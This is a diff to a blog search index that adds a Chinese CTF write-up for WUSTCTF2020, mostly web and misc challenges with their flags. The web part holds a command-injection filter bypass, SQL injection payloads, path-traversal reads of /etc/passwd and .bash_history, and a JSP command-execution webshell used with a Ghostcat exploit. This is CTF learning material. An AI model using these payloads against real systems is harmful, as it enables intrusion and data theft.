@@ -1,6 +1,90 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>WUSTCTF2020复盘</title>
+    <url>/2020/04/02/WUSTCTF2020/</url>
+    <content><![CDATA[<!--看不下去资料呀，web基础知识也学不下去呀，唉，先面向题目学习吧-->
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="朴实无华"><a href="#朴实无华" class="headerlink" title="朴实无华"></a>朴实无华</h3><p>robots协议、HTTP头、简单bypass</p>
+<p>看网页标题，暗示查看<code>robots.txt</code>，在里面发现<code>fAke_f1agggg.php</code></p>
+<p>访问后F12，查看到http头中有一项<code>Look_at_me: /fl4g.php</code></p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//level 2 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123; </span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>]; </span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5)) </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>; </span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123; </span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123; </span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>; </span><br><span class="line">        system($get_flag); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>intval()函数可以用十六进制等于0，intval($num + 1)会强制转化来绕过</p>
+<p>$md5==md5($md5)这个需要爆破出来一个0e开头的md5加密后还是0e开头的字符串（百度也行</p>
+<p>官方wp那里嫖来的脚本（<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-24-solves" target="_blank" rel="noopener">52HeRtz</a>）</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> dict_az</span><br><span class="line">	dict_az = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		result = <span class="string">'0e'</span></span><br><span class="line">		result += str(i)</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line">		hashed_s = hashlib.md5(result.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">		r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line">		<span class="keyword">if</span> r:</span><br><span class="line">			print(<span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(result, hashed_s))</span><br><span class="line">			exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> i % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">			print(<span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(result, str(i)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] found! md5( 0e215962017 ) ---&gt; 0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure></div>
+
+<p>绕过后，<code>get_flag=ls</code>看一下都有啥文件，发现flag文件<code>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
+<p>过滤了空格、cat、wctf2020，可以构造<code>get_flag=ca\t${IFS}flll*</code>，得到flag</p>
+<h3 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h3><p>整数型注入，过滤了空格和union，sqlmap的UA</p>
+<p>用/**/代替空格，双写union绕过:ununionion</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">猜列</span><br><span class="line">1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata</span><br><span class="line">查表</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;ctf&#39;</span><br><span class="line">查列</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(value)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h3><p>注册、登录后，文件上传绕过exif_imagetype()就好，加个文件头GIF89a</p>
+<p>对后缀没有限制上传php就好,蚁剑连上在根目录就会发现flag（原题好像是权限不够，需要运行readflag</p>
+<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>考点：JSP、CVE-2020-1938幽灵猫文件包含</p>
+<p>参考的博客：<a href="https://imagin.vip/?p=1126#easyweb" target="_blank" rel="noopener">IMAGIN’S BLOG</a>、<a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">颖奇L’Amore</a>、<a href="http://github.mrkaixin.computer/2020/04/03/WUST-CTF2020/" target="_blank" rel="noopener">Mr.Kaixin</a>、<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">52HeRtz’s Blog</a></p>
+<p>这题卡了好久，还是第一次做这种根据CVE改的CTF题目，最初看官方wp纠结于pocsuite的使用，配置了好久，用不来。。然后就去看了下别的大佬的博客，自己又摸索了半天才搞出来。。</p>
+<p>这里有两种解法。</p>
+<p>预期解就是上传一个jsp命令执行🐎，然后用幽灵🐱漏洞去包含这个🐎，执行后通过回显得知flag的位置。</p>
+<p>非预期就是通过任意文件下载来读/home/tomajp/.bashrc_history，从而得到执行生成flag时的存放位置，进而去读flag所在文件得到flag，但是在buu上由于是docker生成的所以不需要去通过tomajp用户去生产flag所以就无非预期了。(其实还有，如果你能猜到根目录下存放flag的文件的名字，不过基本不可能。。因为它叫<code>flag78bt787it8b9b098j0k80k0ggg</code></p>
+<p>非预期解还挺简单的:</p>
+<p>1.任意上传一个文件，然后用错误的文件名去读一下，文件路径就会暴露出来</p>
+<a href="/2020/04/02/WUSTCTF2020/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>2.<code>download?file=../../../../../../../etc/passwd</code>读到存在tomajp用户，然后下载它的bash_history文件 <code>download?file=../../../../../../../home/tomajp/.bash_history</code>发现执行过的命令，发现flag存放的文件夹，然后读取flag存放文件夹<code>download?file=../../../../../../../flaaaag/what_you_want</code>得到flag</p>
+<p>预期解：</p>
+<p>1.上传一个jsp🐎</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">jsp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">"执行的命令"</span>).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">	out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">执行的命令:</span></span><br><span class="line"><span class="comment">ls -al \ 被这个\坑傻了自动把后面的"转译了报错字符串闭合问题，不懂java的我还以为是字符串里的空格问题，后来偶然看到转译\\r的时候才反应过来所以我把命令换成了ls -al /</span></span><br><span class="line"><span class="comment">cat /flag78bt787it8b9b098j0k80k0ggg</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<p>2.通过AJP包含这个jsp文件，从而执行其中的代码（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">脚本地址</a></p>
+<a href="/2020/04/02/WUSTCTF2020/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>发现根目录下flag存放位置，读取得到flag</p>
+<a href="/2020/04/02/WUSTCTF2020/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>详细步骤：先把这个ajpShooter.py上传到buu的linux-lab的机子上，然后用这个脚本包含你上传的文件，最后通过各样式的命令执行得到flag。反弹shell那个jsp脚本我用不来。。（注意：<code>Lan Domain: 2554-169ec896-03d5-483f-97ca-369fbcc3bdbf</code>用的是局域网，用read可以去读取文件的内容，eval是输出文件执行的结果。</p>
+<p>最后有时间去复现一下这个漏洞<a href="https://www.liuyixiang.com/post/109123.html" target="_blank" rel="noopener">CVE-2020-1938</a></p>
+<h3 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h3><p>这个等学学目录跨越和jsp相关知识再来复现吧。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>考点：电话音、九键键盘</p>
+<p>这次有点多就不对着表手解了，用个自动化工具<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf-decoder</a>搞一下得到</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure></div>
+
+<p>对着九键键盘翻译一下得到flag：<code>flag{youaremygirlfriends}</code></p>
+<h3 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a>find_me</h3><p>看备注+<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">盲文转换</a></p>
+<a href="/2020/04/02/WUSTCTF2020/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>
+
+<h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><p>判断文件类型为pdf，用wps等工具打开，图片后面有另一个图片，得到字符串</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure></div>
+
+<p><a href="https://www.qqxiuzi.cn/bianma/base.php?type=16" target="_blank" rel="noopener">base16解码</a>，得到flag：<code>wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</code></p>
+<h3 id="spaceclub"><a href="#spaceclub" class="headerlink" title="spaceclub"></a>spaceclub</h3><p>长空格为1，空格为0得到</p>
+<p>011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</p>
+<p>2进制转ASCII，得到flag：<code>wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}</code></p>
+<h3 id="alison-likes-jojo"><a href="#alison-likes-jojo" class="headerlink" title="alison_likes_jojo"></a>alison_likes_jojo</h3><p>文件分离、zip爆破、多次base64、outguess</p>
+<p>boki.jpg分离出一个zip，爆破出来密码是<code>888866</code>，得到一个文本多次base64解密后得到key：<code>killerqueen</code></p>
+<p>stegdetect测不出来。。看wp，没说啥软件测出来的。。就嗯猜？？</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -r jljy.jpg -k <span class="string">"killerqueen"</span> 1.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag：<code>wctf2020{pretty_girl_alison_likes_jojo}</code></p>
+<h3 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h3><p>这个密码学题更像misc，就写到这里吧</p>
+<p>新佛曰、社会主义核心价值观、栏栅、凯撒、base32</p>
+<p>前三个还好，凯撒那个位数是真的有、恶心（官方解释：凯撒密码最广的是移位3位，很多在线解码器默认也是3位，所以这里也是3位移位。</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑</span><br><span class="line">平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等</span><br><span class="line">RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</span><br><span class="line">R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar_</span><br><span class="line">o5rxizrsgazda63onfpwqylpl54gsylom5pxq2lbnztv6zdbl53w67i</span><br></pre></td></tr></table></figure></div>
+
+<p>最后再来个base32，得到flag：<code>wctf2020{ni_hao_xiang_xiang_da_wo}</code></p>
+]]></content>
+      <categories>
+        <category>Write_up</category>
+      </categories>
+      <tags>
+        <tag>Write_up</tag>
+        <tag>Web</tag>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MRCTF复盘</title>
     <url>/2020/03/30/MRCTF/</url>
     <content><![CDATA[<p>周末有两场比赛，WUST和MRCTF，都去看了一下（虽然没咋做题），密码学烦人啊（真滴难），还是在buu复盘有意思</p>
@@ -106,6 +190,7 @@
 <a href="/2020/03/30/MRCTF/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/12.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>登录得到flag</p>
+<h3 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h3><p>一个复杂的反序列化，待补充</p>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cyberpunk"><a href="#Cyberpunk" class="headerlink" title="Cyberpunk"></a>Cyberpunk</h3><p>当时还以为要逆向…..跑程序之前，改一下电脑日期就可</p>
 <a href="/2020/03/30/MRCTF/13.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/13.png" src="/img/loading.gif" class="lazyload"></a>
 
@@ -321,8 +406,8 @@
       <tags>
         <tag>Write_up</tag>
         <tag>Web</tag>
-        <tag>Crypto</tag>
         <tag>misc</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
